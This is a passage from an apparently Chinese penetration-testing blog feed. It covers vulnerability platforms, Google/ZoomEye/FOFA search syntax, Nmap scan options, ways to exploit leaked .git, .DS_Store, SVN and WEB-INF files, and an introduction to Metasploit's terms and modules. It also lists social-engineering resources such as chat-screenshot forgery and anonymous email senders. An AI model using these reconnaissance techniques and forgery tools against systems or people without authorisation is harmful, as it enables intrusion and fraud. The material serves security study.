href="http://www.bugx.org/">http://www.bugx.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>Gsrc 瓜子 src ：<span class="exturl"><a class="exturl__link" href="https://security.guazi.com/">https://security.guazi.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>区块链安全相应中心：<span class="exturl"><a class="exturl__link" href="https://dvpnet.io/">https://dvpnet.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>CNVD 国家信息安全漏洞平台：<span class="exturl"><a class="exturl__link" href="http://www.cnvd.org.cn/">http://www.cnvd.org.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>漏洞银行：<span class="exturl"><a class="exturl__link" href="https://www.bugbank.cn/">https://www.bugbank.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>360 补天：<span class="exturl"><a class="exturl__link" href="https://www.butain.net/">https://www.butain.net/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </li><li>教育行业漏洞报告平台(Beta)：<span class="exturl"><a class="exturl__link" href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-5-2-国内平台">          <a href="#1-5-2-国内平台" class="heading-link"><i class="fas fa-link"></i></a>1.5.2.国内平台</h3>      <ol><li>知道创宇 Seebug 漏洞平台：<span class="exturl"><a class="exturl__link" href="https://www.seebug.org/">https://www.seebug.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>工控系统行业漏洞平台：<span class="exturl"><a class="exturl__link" href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>打造中文最大 exploit 库：<span class="exturl"><a class="exturl__link" href="http://www.expku.com/">http://www.expku.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>为数不多的漏洞管理插件收集平台：<span class="exturl"><a class="exturl__link" href="http://www.bugscan.net/source/template/vulns/">http://www.bugscan.net/source/template/vulns/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>一家管理漏洞收集平台：<span class="exturl"><a class="exturl__link" href="http://www.0daybank.org/">http://www.0daybank.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-5-3-国外平台">          <a href="#1-5-3-国外平台" class="heading-link"><i class="fas fa-link"></i></a>1.5.3.国外平台</h3>      <ol><li>国际漏洞提交平台：<span class="exturl"><a class="exturl__link" href="https://www.hackerone.com/">https://www.hackerone.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>xss poc ：<span class="exturl"><a class="exturl__link" href="http://xssor.io/">http://xssor.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>0day 漏洞库：<span class="exturl"><a class="exturl__link" href="https://www.0day.today/">https://www.0day.today/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>路由器漏洞库：<span class="exturl"><a class="exturl__link" href="http://routerpwn.com/">http://routerpwn.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>cve 漏洞平台：<span class="exturl"><a class="exturl__link" href="http://cve.mitre.org/">http://cve.mitre.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-5-4-威胁情报">          <a href="#1-5-4-威胁情报" class="heading-link"><i class="fas fa-link"></i></a>1.5.4.威胁情报</h3>      <ol><li>安全数据交流平台：<span class="exturl"><a class="exturl__link" href="https://www.secsilo.com/">https://www.secsilo.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>华为安全情报：<span class="exturl"><a class="exturl__link" href="https://isecurity.huawei.com/sec/web//intelligencePortal.do">https://isecurity.huawei.com/sec/web//intelligencePortal.do</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>威胁情报共享平台：<span class="exturl"><a class="exturl__link" href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>被黑站点统计：<span class="exturl"><a class="exturl__link" href="http://www.hacked.com.cn/">http://www.hacked.com.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-5-5-社工库">          <a href="#1-5-5-社工库" class="heading-link"><i class="fas fa-link"></i></a>1.5.5.社工库</h3>      <ol><li>微信伪造：<span class="exturl"><a class="exturl__link" href="http://www.jietuyun.com/">http://www.jietuyun.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>任意邮箱发送：<span class="exturl"><a class="exturl__link" href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 和 <span class="exturl"><a class="exturl__link" href="https://emkei.cz/">https://emkei.cz/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>临时邮箱：<span class="exturl"><a class="exturl__link" href="http://www.yopmail.com/">http://www.yopmail.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>邮箱池群：<span class="exturl"><a class="exturl__link" href="http://veryvp.com/">http://veryvp.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>社工库：<span class="exturl"><a class="exturl__link" href="http://www.uneihan.com/">http://www.uneihan.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h2 id="1-6-Google-Hack">          <a href="#1-6-Google-Hack" class="heading-link"><i class="fas fa-link"></i></a>1.6. Google Hack</h2>              <h3 id="1-6-3-实战">          <a href="#1-6-3-实战" class="heading-link"><i class="fas fa-link"></i></a>1.6.3.实战</h3>      <p>Google搜索引擎之所以强大，关键在于它详细的搜素关键词，以下是几个常用的搜素关键词: (更多详细教里，参见：<span class="exturl"><a class="exturl__link" href="http://user.qzone.qq.com/568311803/main)%E3%80%82">http://user.qzone.qq.com/568311803/main)。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><ol><li>inurl:用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用。</li><li>intext:只搜索网页部分中包含的文字(例如：管理后台，也就是忽略了标题， URL等的文字) </li><li>site:可以限制你搜索范围的域名</li><li>filetype:搜索文件的后级或者扩展名</li><li>intitle:限制你搜索的网页标题</li><li>allintitle:搜索所有关键字构成标题的网页，但是推荐不要使用。</li><li>link:可以得到一个所有包含了某个指定URL的页面列表，例如： link :www. google. com就可以得到所有连接到Google的页面。</li></ol>        <h2 id="1-7-Nmap-端扫">          <a href="#1-7-Nmap-端扫" class="heading-link"><i class="fas fa-link"></i></a>1.7 Nmap 端扫</h2>      <p>功能介绍：<span class="exturl"><a class="exturl__link" href="http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html">http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p><p>10种扫描解释：<span class="exturl"><a class="exturl__link" href="http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html">http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  </p>        <h3 id="1-7-1-功能介绍">          <a href="#1-7-1-功能介绍" class="heading-link"><i class="fas fa-link"></i></a>1.7.1 功能介绍</h3>      <p>Nmap 是一个网路连接端口扫描软件，用来扫描网上电脑开放的网络连接端口，确定哪些服务器运行在哪些连接端口，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p><p><strong>功能架构图：</strong></p><p>主机发现 —&gt; 端口扫描 —&gt; 版本侦测 —&gt; OS 侦测</p>        <h3 id="1-7-2-主机发现">          <a href="#1-7-2-主机发现" class="heading-link"><i class="fas fa-link"></i></a>1.7.2.主机发现</h3>      <p><strong>1）主机发现原理：</strong></p><p>主机发现的原理和ping 命令类似，发送探测包给目标主机，如果收到回复，说明目标主机是开启的。Nmap 支持十多种不同的主机探测方式，比如：发送 ICMPECHO / TIMESTAMP / NETMASK 报文，发送 SCTP INIT / COOKIE-ECHO 包，用户可以在不同的条件下灵活选用不同的方式来探测目标主机。</p><p><strong>2）主机发现的基本用法：</strong></p><ol><li>-sL：List Scan 列表扫描，仅将指定的目标的 IP 列举出来，不进行主机发现。</li><li>-sn：Ping Scan 只进行主机发现，不进行端口扫描</li><li>-Pn：将所有指定的主机视作开启的，跳过主机发现的过程。</li><li>-PS/PA/PU/PY[portlist]：使用 TCPSYN / ACK 或 SCTP INIT / ECHO 方式进行发现。</li><li>-PE/PP/PM：使用 ICMP echo ，timestamp，and netmask 请求包发现主机。</li><li>-PO[protocollist]：使用 IP 协议包探测对方主机是否开启。</li><li>-n/-R：-n表示不进行 DNS 解析，-R表示总是进行 DNS 解析。</li><li>–dns-servers &lt;serv1[,serv2],…&gt;：指定 DNS 服务器。</li><li>–system-dns：指定使用系统的 DNS 服务器。</li><li>–traceroute：追踪每个路由结点。</li></ol><p><strong>3）使用演示：</strong></p><p>扫描局域网 192.168.0.1-192.168.0.250 范围内哪些 IP 的主机是活动的。</p><p>命令如下：nmap -sn 192.168.0.1-250</p>        <h3 id="1-7-3-端口扫描">          <a href="#1-7-3-端口扫描" class="heading-link"><i class="fas fa-link"></i></a>1.7.3. 端口扫描</h3>      <p>端口扫描时 Nmap 最基本核心的功能，用于确定目标主机的 TCP / UDP 端口开放情况。默认情况下，Nmap 会扫描1000 个最有可能开放的 TCP 端口。Nmap 通过探测将端口划分为6个状态。</p><ol><li>open：端口是开放的。</li><li>closed：端口是关闭的。</li><li>filtered：端口被防火墙 IDS / IPS 屏蔽，无法确定其状态。</li><li>unfiltered：端口没有被屏蔽，但是否开放还需进一步确定。</li><li>open|filtered：端口是开放的或者是屏蔽的。</li><li>closed|filtered：端口是关闭的或者是屏蔽的。</li></ol><p><strong>1）端口扫描方面非常强大的，提供了很多的探测方式。</strong></p><ol><li>TCP SYN scanning</li><li>TCP connect scannin</li><li>TCP ACK scanning</li><li>TCP FIN/Xmas/NULL scanning</li><li>UDP scanning</li><li>其他方式</li></ol><p><strong>2）端口扫描用法：</strong></p><ol><li>-sS/sT/sA/sW/sM：指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans 的方式来对目标主机进行扫描。</li><li>-sU：指定使用 UDP 扫描方式确定目标主机的 UDP 端口状态。</li><li>-sN/sF/sX：指定使用 TCP Null，FIN，and Xmas scans 秘密扫描方式来协助探测对方的 TCP 端口状态。</li><li>–scanflags <flags>：定制 TCP 包的 flags。</flags></li><li>-sI &lt;zombiehost[:probeport]：指定使用 idle scan 方式来扫描目标主机（前提需要找到合适的 zombie host）。</li><li>-sY/sZ：使用 SCTP INIT/COOKIE-ECHO 来扫描 SCTP 协议端口的开放情况。</li><li>-sO：使用 IP protocol 扫描确定目标主机支持的协议类型。</li><li>-b <FTP relay host>：使用 FTP bounce scan 扫描方式。</FTP></li></ol><p><strong>3）使用演示：</strong></p><p>在此，我们以主机 192.168.0.100 为例。</p><p>命令如下：nmap -sS -sU -T4 -top-ports 300 192.168.0.100</p>        <h3 id="1-7-4-版本侦测">          <a href="#1-7-4-版本侦测" class="heading-link"><i class="fas fa-link"></i></a>1.7.4. 版本侦测</h3>      <p><strong>1）版本侦测原理：</strong></p><p>简要地介绍版本的侦测原理。版本 侦测主要分为以下几个步骤：</p><ol><li>首先检查 open 与 open|filtered 状态的端口是否在排除端口列表内，如果在排除列表，将该端口剔除。</li><li>如果是 TCP 端口，尝试建立 TCP 连接。尝试等待片刻（通常6秒或者更久，具体时间可以查询文件 nmap-services-probes 中 Probe TCP NULL q|| 对应的 totalwaitms）。通常在等待时间内，会接收到目标主机发送的 “WelcomeBanner” 信息。nmap 将接收到的 Banner 与 nmap-services-probes 中 NULL probe 中的签名进行对比。查找对应应用程序的名字与版本信息。</li><li>如果通过 “Welcome Banner” 无法确定应用程序版本，那么 nmap 再尝试发送其他的探测包（即从nmap-services-probes 中挑选合适的 probe），将 probe 得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印应用返回报文，让用户自行进一步判定。</li><li>如果是 UDP 端口，那么直接使用 nmap-services-probes 中探测包进行探测匹配。根据结果对比分析出 UDP 应用服务类型。</li><li>如果探测到应用程序是 SSL ，那么调用 openSSL 进一步的侦查运行在 SSL 之上的具体的应用类型。</li><li>如果探测到应用程序是 SunPRC，那么调用 brute-force RPC grinder 进一步探测具体的服务。</li></ol><p><strong>2）版本侦测用法：</strong></p><ol><li>–version-light：指定使用轻量侦测方式。</li><li>–version-all：尝试使用所有的 probe 进行侦测。</li><li>–version-trace：显示出详细的版本侦测过程信息。</li></ol><p><strong>3）使用演示：</strong></p><p>对主机 192.168.0.100 进行版本侦测</p><p>命令如下：nmap -sV 192.168.0.100</p>        <h3 id="1-7-5-OS-侦测">          <a href="#1-7-5-OS-侦测" class="heading-link"><i class="fas fa-link"></i></a>1.7.5. OS 侦测</h3>      <p><strong>1）OS 侦测原理：</strong></p><p>Nmap 使用 TCP/IP 协议栈指纹来识别不同的操作系统和设备。在RFC 规范中，有些地方对 TCP/IP 的实现并没有强制规定，由此不同的 TCP/IP 方案中有可能都有自己的特定方式。Nmap 主要是根据这些细节上的差异来判断操作系统的类型的。</p><p>具体实现方式如下：</p><p>Nmap 内部包含了2600多已知系统的指纹特征（在文件 nmap-os-db 文件中）。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个 open 和 closed 的端口，向其发送经过精心设计的 TCP/UDP/ICMP 数据包，根据返回的数据包生成一份系统指纹。将探测生成的 指纹与 nmap-os-db 中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p><p><strong>2）OS 侦测用法：</strong></p><ol><li>-O：指定 Nmap 进行 OS 侦测。</li><li>–osscan-limit：限制 Nmap 只对确定的主机进行 OS 探测（至少需确知该主机分别有一个 open 和 closed 的端口）。</li><li>–osscan-guess：大胆猜测对方的主机的系统类型。由此准确性会下降不少，但是会尽可能多为用户提供潜在的操作系统。</li></ol><p><strong>3）使用演示：</strong></p><p>命令：nmap -O 192.168.0.100</p>        <h2 id="1-8-DisBuster">          <a href="#1-8-DisBuster" class="heading-link"><i class="fas fa-link"></i></a>1.8 DisBuster</h2>              <h2 id="1-10-扩展-BurpAPP-抓包">          <a href="#1-10-扩展-BurpAPP-抓包" class="heading-link"><i class="fas fa-link"></i></a>1.10 扩展 BurpAPP 抓包</h2>      <p><strong>一. 手机端配置：</strong></p><ol><li><p>让安卓手机和电脑连入同一个WIFI ，即是在同一个无线局域网下。</p></li><li><p>查看电脑的IP，本地输入：ipconfig</p></li><li><p>设置手机代理 IP，将手机的代理IP 设置的和电脑 wifi 的IP一致，</p><p>代理设置为 手动，设置主机名为电脑无线局域网IP，端口可以随便设置（如：8080），其他的设置默认。</p></li></ol><p><strong>二. 电脑端配置：</strong></p><ol><li>打开 Burpsuite ,设置代理代理服务器，设置的IP 和端口要和 手机上设置的一致</li></ol>        <h2 id="1-11-扩展-常见信息泄露利用方法">          <a href="#1-11-扩展-常见信息泄露利用方法" class="heading-link"><i class="fas fa-link"></i></a>1.11. 扩展:常见信息泄露利用方法</h2>              <h3 id="1-11-1-Git-导致文件泄露">          <a href="#1-11-1-Git-导致文件泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.1. Git 导致文件泄露</h3>      <p>由于目前的web项目的开发采用前后端完全分离的架构:前端全部使用静态文件，和后端代码完全分离，隶属两个不同的项目。表态文件使用git 来进行同步发布到服务器，然后使用nginx指向到指定目录，以达到被公网访问的目的。</p><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>例如：192.168.133.130/zvuldrill-git/.git/config</p>        <h3 id="1-11-2-DS-store-导致文件泄露">          <a href="#1-11-2-DS-store-导致文件泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.2. DS_store 导致文件泄露</h3>      <p>Ds_store 是 Mac 下 Finder 用来保存如何展示文件/文件夹的数据文件，每个文件下对应一个。由于开发/设计成员在发布代码时未删除文件夹中隐藏的 Ds_store ，可能造成文件目录结构泄露，源代码文件等敏感信息的泄露。</p><p>我们可以模仿一个环境，利用 phphstudy 搭建 PHP 环境，把 Ds_store 文件传到相关的目录，然后利用工具进行相关检测。</p><p>工具：ds_store_exp，下载地址：<span class="exturl"><a class="exturl__link" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>为了让实验显得更加真实，我们在本地搭建环境，然后建立一个 admin 和 hello 文件夹，利用该工具运行完成后，查看工具文件夹有什么结果。</p><p>这是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归下载文件到本地。</p>        <h3 id="1-11-3-SVN-导致文件泄露">          <a href="#1-11-3-SVN-导致文件泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.3. SVN 导致文件泄露</h3>      <p>Subversion.简称svn ,是一个开放源代码的版本控制系统，相对于的 RCS, CVS，采用了分支管理系统，它的设计目标就是取代cvs，互联网上越来越多的控制服务从cvs 转移到Subversion。</p><p>Subversion使用服务端–客户端的结构 ，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射时(称为“工作副本”)。在这两端之间是通过各种仓库存取层(Repository Acess，简称RA)的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP，SSH等，或本地文件的方式来对仓库进行操作。</p><p>SVN 漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具.利用方法如下:</p><ol><li>漏洞利用工具: Seay-SVN 漏洞利用工具。</li><li>添加网站 url</li><li>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至载整站。</li></ol>        <h3 id="1-11-4-WEB-INF-web-xml-泄露">          <a href="#1-11-4-WEB-INF-web-xml-泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.4. WEB-INF/web.xml 泄露</h3>      <p>WEB-INF 是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主现包含一下文件或目录。</p><p>/WEB-INF/web.xml: Web 应用程序配置文件，描述了servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/:包含了站点所有用的class 文件，包括servlet class 和非servlet class，他们不能包含在 jar 文件中。</p><p>/WEB-INF/lib/: 存放web应用需要的各种JAR文件。放置仅在这个应用中要求使用的jar文件，如数据库驱动 jar 文件。</p><p>/WEB-INF/src/: 源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties: 数据库配置文件。</p><p><strong>原因:</strong></p><p>通常一些web应用我们会使用多个web服务器搭配使用,解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等， 在使用这种架构的时候，由于对静态资源目录或映射文件配置不当，可能会引发一些安全问题，导致 web.xml 等文件能够被读取。</p>        <h2 id="1-12-扩展-ZoomEye-hack">          <a href="#1-12-扩展-ZoomEye-hack" class="heading-link"><i class="fas fa-link"></i></a>1.12 扩展: ZoomEye hack</h2>      <p>ZoomEye支持公网设备指纹检素和Web指纹检索的网站，指纹检索包括应用名称，版本，前端框架，后端框架，服务端语言、服务器操作系统，网站容器，内容管理系统和数据库等.</p><p>设备指纹包括：应用名、版本开放端口，操作系统，服务名，地理位置等。</p><p><strong>实战搜索</strong><br>我们今天主要讲下如何使用他的语法规则去高级搜索，搜索有用信息。</p><p>主机设备搜索组件名称。</p><ol><li>app：组件名</li><li>ver：组件版本</li></ol><p>例1：搜索使用iis6.0主机：app:”Microsoft-IIS” ver”6.0”,可以看到0.6秒搜索到41,781,210左右的使用iis6.0的主机。</p><p>例2：搜索使weblogic主机： app: “weblogic httpd” port: 7001 ,可以看到0.078秒搜索到42万左右的使用weblogic的主机。(反序列化漏洞)</p><p>例3：查询开放3389端口的主机： port : 3389</p><p>例4：查询操作系统为Linux系统的服务器， os:linux</p><p>例5：查询公网摄像头： service:”routersetup”</p><p>例6：搜索美国的Apache 服务器：app: Apache country:US ，后面还可以接 city</p><p>例7：搜索指定IP信息：ip:121.42.173.26</p><p>例8：查询 taobao.com 有关域名信息：site:taobao.com</p><p>例9：搜索标题中包含该字符的网站：title:weblogic</p><p>例10：keywords:Nginx</p>        <h2 id="1-13-扩展：fofa-hack">          <a href="#1-13-扩展：fofa-hack" class="heading-link"><i class="fas fa-link"></i></a>1.13. 扩展：fofa hack</h2>      <p>domin=”” || ip=”” || host=”” || title=”” || header=”” ;</p><p>protocol=”https”，搜索指定协议类型</p><p>app=”phpinfo”，搜索某些组件相关系统</p><p>host=”baidu.com”，搜索包含有特定字符的 URL</p><p>title=”powered by” &amp;&amp; os=windows 搜索网页标题中包含有特定字符并且系统是 windows 的网页</p><p>详细看官方详细文档：<span class="exturl"><a class="exturl__link" href="https://fofa.so/help_articles/">https://fofa.so/help_articles/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF框架</title>
      <link href="2020/07/04/MSF/"/>
      <url>2020/07/04/MSF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="一-初识-MSF">          <a href="#一-初识-MSF" class="heading-link"><i class="fas fa-link"></i></a>一.初识    MSF</h1>              <h2 id="1-1什么是Metasploit">          <a href="#1-1什么是Metasploit" class="heading-link"><i class="fas fa-link"></i></a>1.1什么是Metasploit</h2>      <p>Metasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时,计算机安全状况也被永久性地改变了。仿佛一夜之间， 任何人都可以成为黑客,每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补J的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具,并将它们贡献给所有MSF用户。<br>MSF的设计初衷是打造成一个攻击工具开发平台 ,然而在目前情况下,安全专家以及业余安全爱好者更多地将其当作种点几下 鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。</p><a id="more"></a>        <h2 id="1-2MSF专业术语讲解">          <a href="#1-2MSF专业术语讲解" class="heading-link"><i class="fas fa-link"></i></a>1.2MSF专业术语讲解</h2>              <h3 id="1-2-1渗透攻击-Exploit">          <a href="#1-2-1渗透攻击-Exploit" class="heading-link"><i class="fas fa-link"></i></a>1.2.1渗透攻击(Exploit)</h3>      <p>渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。<br>流行的攻击技术包括:缓冲区溢出、Web应用程序漏洞攻击,以及利用配置错误等。</p>        <h3 id="1-2-2攻击载荷-Payload">          <a href="#1-2-2攻击载荷-Payload" class="heading-link"><i class="fas fa-link"></i></a>1.2.2攻击载荷(Payload)</h3>      <p>攻击载何是我们期望目标系统在被渗透攻击后而执行的代码，在框架中可以自由的选择、传送和植入。比如，反弹式shell 是一种从目标主机到攻击主机创建网络连接,并提供命令行shell 的攻击载荷。bind shell 攻击载荷则在目标主机上将命令行shell 绑定到一个打开的监听端口,攻击者可以连接这些端口来取得shell交互。</p>        <h3 id="1-2-3溢出代码-Shellcode">          <a href="#1-2-3溢出代码-Shellcode" class="heading-link"><i class="fas fa-link"></i></a>1.2.3溢出代码(Shellcode)</h3>      <p>shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下,目标系统执行了shellcode这一组指令后 才会提供一个命令行shell或者Meterpreter shell ,这也是shellcode名称的由来。</p>        <h3 id="1-2-4模块-Module">          <a href="#1-2-4模块-Module" class="heading-link"><i class="fas fa-link"></i></a>1.2.4模块( Module)</h3>      <p>在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候,你可能会使用一个渗透攻击模块( Exploit module ).也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用个辅助模块( auxiliary module ).用来扫描一些诸如扫描或系统查点的攻击动作。</p>        <h3 id="1-2-5监听器-Listener">          <a href="#1-2-5监听器-Listener" class="heading-link"><i class="fas fa-link"></i></a>1.2.5监听器(Listener)</h3>      <p>监听器是MSF中用来等待连入网络连接的组件。举例来说,在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</p>        <h1 id="二-更新MSF以及目录结构">          <a href="#二-更新MSF以及目录结构" class="heading-link"><i class="fas fa-link"></i></a>二.更新MSF以及目录结构</h1>              <h2 id="2-1-如何更新MSF">          <a href="#2-1-如何更新MSF" class="heading-link"><i class="fas fa-link"></i></a>2.1.如何更新MSF</h2>      <p>首先，替换源，可以换成阿里源，将原本的源用#注释掉，因为国内访问它的源太慢。</p><p>然后，添加数字签名。</p><p>有时候会出现故障，就得把老的MSF卸载：apt remove metasploit-framework</p><p>更新命令：apt-get update（这些都是在msf中执行的命令）</p><p>安装MSF框架：apt-get install metasploit-framework</p><p>进入msf：msfconsole</p><p>若提示没有相应的数据库支持：quit (退出msf)</p><p>启动数据库：systemctl start postgresql</p><p>允许开机自启：systemctl enable postgresql</p><p>构建数据库缓存：msfdb init</p>        <h2 id="2-2-MSF的目录结构">          <a href="#2-2-MSF的目录结构" class="heading-link"><i class="fas fa-link"></i></a>2.2.MSF的目录结构</h2>      <p>MSF 在BT5下存放目录：/opt/MSF</p><p>MSF 在kali 下存放目录：/usr/share/metasploit-framework/</p>        <h2 id="2-3-Modules-模块">          <a href="#2-3-Modules-模块" class="heading-link"><i class="fas fa-link"></i></a>2.3.Modules(模块)</h2>      <p>存放路径：/usr/share/metasploit-framework/modules/(个人写的模块也可以存放在这里)</p>        <h3 id="2-3-1-Auxiliary">          <a href="#2-3-1-Auxiliary" class="heading-link"><i class="fas fa-link"></i></a>2.3.1.Auxiliary</h3>      <p>主要包含渗透测试中一些辅助性的脚本，这些即本功能有扫描，嗅探，破解，注入，漏洞挖掘等。</p>        <h3 id="2-3-2-Encoders">          <a href="#2-3-2-Encoders" class="heading-link"><i class="fas fa-link"></i></a>2.3.2.Encoders</h3>      <p>各种编码工具用于躲过入侵检测和过滤系统。</p>        <h3 id="2-3-3-Exploits">          <a href="#2-3-3-Exploits" class="heading-link"><i class="fas fa-link"></i></a>2.3.3.Exploits</h3>      <p>主要包含了传说中的exp、0day. 各种漏洞利用的脚本。主要的攻击代码全在这，这里边包含的exp的路径的命名规则是系统/服务/模块，在使用exp是可以根据这个命名方法来找(也可以用search这条指令来找)比如:use exploits/windows(系统)/vnc(服务)/realvnc_client(模块名)</p>        <h3 id="2-3-4-Nops">          <a href="#2-3-4-Nops" class="heading-link"><i class="fas fa-link"></i></a>2.3.4.Nops</h3>      <p>NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x9…)则会因为被拦截而导致攻击失效，所以此时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到(后面会有介绍)。比如我们打开php的NOPS生成脚本,就会发现它只是返回了指定长度的空格而已。(不理解没关系)。</p>        <h3 id="2-3-5-Payloads">          <a href="#2-3-5-Payloads" class="heading-link"><i class="fas fa-link"></i></a>2.3.5.Payloads</h3>      <p>这个单词翻译过来叫载荷:是攻击者发送给系统执行的指令(不包含exploits 攻击阶段) , payloads主要是在目标机执行的,而exploits是在本地机执行作用于目标机。命名规则是:系统/类型/名称比如: use payloads/windows/shell/bind_tcp.</p>        <h3 id="2-3-6-Post">          <a href="#2-3-6-Post" class="heading-link"><i class="fas fa-link"></i></a>2.3.6.Post</h3>      <p>这个目录里放着msf的exploits执行成功后,向目标机发送的一些功能性指令,比如:提权,获取hash等。</p>        <h3 id="2-3-7-Data">          <a href="#2-3-7-Data" class="heading-link"><i class="fas fa-link"></i></a>2.3.7.Data</h3>      <p>这个目录里盛放了Meterpreter、PassiveX、 Vnc、 DLLS 等这些工具和一些用户接口代码, Msfweb和一些其他模块用到的数据文件。</p><p>Data下js文件夹下的Detect ,这里面存放的是MSF的探针文件。如果看过MSF浏览器攻击脚本的代码,就会发现调用了一个js库，然后检查当前请求是否符合被攻击环境。如果符合则发送攻击代码,否则中断。Memory中主要是一些堆喷射代码。 在大部分浏览器漏洞利用过程,堆喷射是一个不可或缺的过程(当然不是绝对的! )。并且不同的浏览器及版本间,堆喷射代码都有所不同。</p>        <h3 id="2-3-8-Plugins">          <a href="#2-3-8-Plugins" class="heading-link"><i class="fas fa-link"></i></a>2.3.8.Plugins</h3>      <p>这里的模块用户需要使用load来加载提供数据库连接插件和各种要用到的插件。</p>        <h3 id="2-3-9-Scripts">          <a href="#2-3-9-Scripts" class="heading-link"><i class="fas 